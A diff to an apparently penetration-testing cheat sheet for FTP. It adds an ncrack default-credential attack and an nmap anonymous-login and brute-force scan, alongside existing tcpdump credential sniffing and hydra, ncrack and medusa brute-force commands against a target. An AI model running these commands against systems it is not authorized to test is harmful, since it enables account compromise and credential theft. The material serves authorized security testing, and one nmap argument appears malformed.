@@ -20,6 +20,10 @@ Checks if an FTP server allows anonymous logins.
 Capture credentials in plain text through unencrypted traffic (HTTP, FTP, TELNET)
 
     $ tcpdump -A -i eth0 'port http or port ftp or port telnet' | grep -i 'user\|pass\|login'
+    
+## FTP Default Credentials
+
+    $ ncrack -U user.txt -P pass.txt --pairwise -oX - ftp://[TARGET_IP]:21,to=300
 
 ## FTP Connection 
 Access the host utilizing FTP
@@ -76,6 +80,7 @@ Usage: login <user|URL> [<pass>]
     $ hydra -l root -P passwords.txt [-t 32] [TARGET_IP] ftp
     $ ncrack -p 21 --user root -P passwords.txt [TARGET_IP] [-T 5]
     $ medusa -u root -P 500-worst-passwords.txt -h [TARGET_IP] -M ftp
+    $ nmap -Pn -n -p21 --script +ftp-anon,+ftp-brute --script-args brute.mode=creds,brute.credfile=creds.txt,brute.useraspass=false,ftp-anon.maxlist=[TARGET_IP]
 
 ## Metasploit - Upload File through FTP (Windows)
     1. > Use exploit/multi/handler 
